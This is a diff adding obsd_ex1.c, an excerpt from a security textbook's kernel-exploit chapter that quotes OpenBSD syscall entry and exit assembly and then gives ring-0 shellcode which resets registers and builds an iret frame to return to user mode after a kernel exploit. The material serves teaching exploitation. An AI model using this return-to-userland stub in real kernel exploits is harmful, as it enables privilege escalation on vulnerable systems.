@@ -1,0 +1,91 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 24: Kernel Exploits
+obsd_ex1.c
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+
+
+IDTVEC(syscall)
+        pushl   $2              # size of instruction for restart
+syscall1:
+        pushl   $T_ASTFLT       # trap # for doing ASTs
+        INTRENTRY
+        movl    _C_LABEL(cpl),%ebx
+        movl    TF_EAX(%esp),%esi       # syscall no
+[1]     call    _C_LABEL(syscall)
+2:      /* Check for ASTs on exit to user mode. */
+        cli
+        cmpb    $0,_C_LABEL(astpending)
+        je      1f
+        /* Always returning to user mode here. */
+        movb    $0,_C_LABEL(astpending)
+        sti
+        /* Pushed T_ASTFLT into tf_trapno on entry. */
+        call    _C_LABEL(trap)
+        jmp     2b
+1:      cmpl    _C_LABEL(cpl),%ebx
+        jne     3f
+[2]     INTRFASTEXIT
+
+#define INTRFASTEXIT \
+        popl    %es             ; \
+        popl    %ds             ; \
+        popl    %edi            ; \
+        popl    %esi            ; \
+        popl    %ebp            ; \
+        popl    %ebx            ; \
+        popl    %edx            ; \
+        popl    %ecx            ; \
+        popl    %eax            ; \
+        addl    $8,%esp         ; \
+        iret
+
+# no interrupts while switching to user mode cli
+# what 'bout if astpending is set ?
+# screw it! async traps will hopefully be served later
+
+# set up various selectors for user-land
+# es = ds = 0x1f
+pushl $0x1f
+popl  %es
+pushl $0x1f
+popl  %ds
+
+# esi = esi = 0x00
+pushl $0x00
+popl  %edi
+pushl $0x00
+popl  %esi
+
+# ebp = 0xdfbfd000
+pushl $0xdfbfd000
+popl  %ebp
+
+# ebx = edx = ecx = eax = 0x00
+pushl $0x00
+popl  %ebx
+pushl $0x00
+popl  %edx
+pushl $0x00
+popl  %ecx
+pushl $0x00
+popl  %eax
+
+pushl $0x1f             # ss = 0x1f
+pushl $0xdfbfd000       # esp  = 0xdfbfd000
+pushl $0x287            # eflags
+pushl $0x17             # cs user-land code segment selector
+
+# set set user mode instruction pointer in exploit code
+pushl $0x00000000       # empty slot for ring3 %eip
+iret
